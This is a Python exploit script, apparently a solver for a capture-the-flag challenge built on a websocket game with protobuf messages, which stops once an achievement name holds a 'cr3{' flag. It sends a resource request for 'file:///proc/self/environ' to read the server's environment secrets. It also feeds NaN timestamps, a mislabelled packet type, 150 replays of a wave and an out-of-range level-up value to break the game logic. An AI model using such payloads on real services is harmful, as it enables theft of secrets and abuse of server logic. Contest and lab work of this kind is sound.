#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from math import nan
from threading import Condition, Thread
from typing import Type
from enum import IntEnum, unique
from dataclasses import dataclass
from typing import Literal
from time import sleep

from google.protobuf.message import Message as ProtoMessage
from loguru import logger

from websockets.sync.client import connect
from sys import exit as exit_

import protocol_pb2 as proto
from protocol_pb2 import (
    CRequestResource,
    Packet,
    PacketId,
    SAchievementUnlocked,
    SInventory,
    SInventoryEquip,
    SLevelUp,
    SPing,
    SRequestResource,
    Wave,
    CInventory,
    CInventoryEquip,
    CLevelUp,
    CPing,
)


@logger.catch
def serialize_message(item: ProtoMessage) -> bytes:
    out_packet = Packet()

    if isinstance(item, SAchievementUnlocked):
        out_packet.type = PacketId.PACKET_ID_ACHIEVEMENT_UNLOCKED
    elif isinstance(item, SInventory) or isinstance(item, CInventory):
        out_packet.type = PacketId.PACKET_ID_INVENTORY
    elif isinstance(item, SInventoryEquip) or isinstance(item, CInventoryEquip):
        out_packet.type = PacketId.PACKET_ID_INVENTORY_EQUIP
    elif isinstance(item, Wave):
        out_packet.type = PacketId.PACKET_ID_WAVE
    elif isinstance(item, SLevelUp) or isinstance(item, CLevelUp):
        out_packet.type = PacketId.PACKET_ID_LEVEL_UP
    elif isinstance(item, SPing) or isinstance(item, CPing):
        out_packet.type = PacketId.PACKET_ID_PING
    elif isinstance(item, SRequestResource) or isinstance(item, CRequestResource):
        out_packet.type = PacketId.PACKET_ID_REQUEST_RESOURCE
    else:
        out_packet.type = PacketId.PACKET_ID_PING

    out_packet.value = item.SerializeToString()

    return out_packet.SerializeToString()



@unique
class EPacketType(IntEnum):
    PING = 0
    WAVE = 1
    INVENTORY = 2
    INVENTORY_EQUIP = 3
    LEVEL_UP = 4
    ACHIEVEMENT_UNLOCKED = 5
    RESOURCE = 6


NET_ENDIANNESS: Literal['little', 'big'] = 'little'
V1_MAGIC: int = int.from_bytes(b'meme', byteorder=NET_ENDIANNESS)
HEADER_SIZE: int = 6


@dataclass(frozen=True)
class Message:
    magic: int
    packet_type: EPacketType
    packet_data: bytearray


def read_message(raw_data: bytes) -> Message:
    magic: int = int.from_bytes(raw_data[0:4], byteorder=NET_ENDIANNESS)
    packet_type: int = int.from_bytes(raw_data[4:6], byteorder=NET_ENDIANNESS)

    e_packet_type: EPacketType = EPacketType(packet_type)

    return Message(
        magic=magic,
        packet_type=e_packet_type,
        packet_data=bytearray(raw_data[HEADER_SIZE:])
    )


def assemble_message_with_header(packet_type: EPacketType, response: bytes) -> bytearray:
    result = bytearray()
    result.extend(V1_MAGIC.to_bytes(4, byteorder=NET_ENDIANNESS))
    result.extend(packet_type.value.to_bytes(2, byteorder=NET_ENDIANNESS))
    result.extend(response)
    return result


while True:
    for i in range(4):
        try:
            ws = connect('ws://frontend:13388/ws', origin='https://spurdo-ebinling.1337.sb/')
            break
        except Exception as e:
            if i == 3:
                raise e
            sleep(5)
            continue
    poll_th: Thread
    condition = Condition()

    last_response: ProtoMessage

    wave_info: Wave
    mobs_n: int = 0
    pool_th_running: bool = True
    EXIT_CODE: int = 1

    PACKETS = {
        PacketId.PACKET_ID_PING: SPing,
        PacketId.PACKET_ID_WAVE: Wave,
        PacketId.PACKET_ID_INVENTORY: SInventory,
        PacketId.PACKET_ID_INVENTORY_EQUIP: SInventoryEquip,
        PacketId.PACKET_ID_LEVEL_UP: SLevelUp,
        PacketId.PACKET_ID_ACHIEVEMENT_UNLOCKED: SAchievementUnlocked,
        PacketId.PACKET_ID_REQUEST_RESOURCE: SRequestResource,
    }


    def load_message(message: Message) -> ProtoMessage:
        c_packet = Packet()
        c_packet.ParseFromString(bytes(message.packet_data))

        cls_type: Type[ProtoMessage] = PACKETS[c_packet.type]
        result: ProtoMessage = cls_type()

        result.ParseFromString(c_packet.value)
        return result


    def poll_thread() -> None:
        global last_response, wave_info, mobs_n, EXIT_CODE

        while pool_th_running:
            message = read_message(ws.recv())
            deserialized_message = load_message(message)

            # print(f'<- {type(deserialized_message)}')

            if isinstance(deserialized_message, SPing):
                pass
            elif isinstance(deserialized_message, SInventoryEquip):
                pass
            elif isinstance(deserialized_message, SInventory):
                pass
            elif isinstance(deserialized_message, SLevelUp):
                pass
            elif isinstance(deserialized_message, SAchievementUnlocked):
                print(f'<- achievement_name: {deserialized_message.name}')
                if 'cr3{' in deserialized_message.name:
                    EXIT_CODE = 0
                    break
            elif isinstance(deserialized_message, Wave):
                wave_info = deserialized_message
                mobs_n = len(wave_info.mobs)

            last_response = deserialized_message
            with condition:
                condition.notify()


    poll_th = Thread(target=poll_thread)
    poll_th.start()


    def send_msg(packet_type: EPacketType, message: ProtoMessage) -> ProtoMessage:
        # print(f'-> {packet_type.name} {type(message)}')
        ws.send(assemble_message_with_header(packet_type, serialize_message(message)))

        with condition:
            condition.wait()
        return last_response


    send_msg(EPacketType.RESOURCE, CRequestResource(
        item=f' file:///proc/self/environ'
    ))

    assert not send_msg(EPacketType.RESOURCE, CRequestResource(
        item='https://google.com'
    )).success

    assert not send_msg(EPacketType.RESOURCE, CRequestResource(
        item='https://1.1.1.1'
    )).success

    for i in range(6):
        send_msg(EPacketType.INVENTORY_EQUIP, proto.CLevelUp(item=1))

    send_msg(EPacketType.WAVE, proto.Wave(number=0, mobs=[], current_time=nan))

    first_wave = wave_info

    should_restart: bool = False
    for m in first_wave.mobs:
        if m.invincible:
            should_restart = True
            break

    if should_restart:
        print('restarting...')
        poll_th.join()
        ws.close()
        continue

    first_wave.number = 1
    first_wave.current_time = nan

    for i in range(150):
        send_msg(EPacketType.WAVE, first_wave)

    send_msg(EPacketType.LEVEL_UP, proto.CLevelUp(item=13371337))
    send_msg(EPacketType.WAVE, first_wave)

    poll_th.join()
    ws.close()
    exit_(EXIT_CODE)
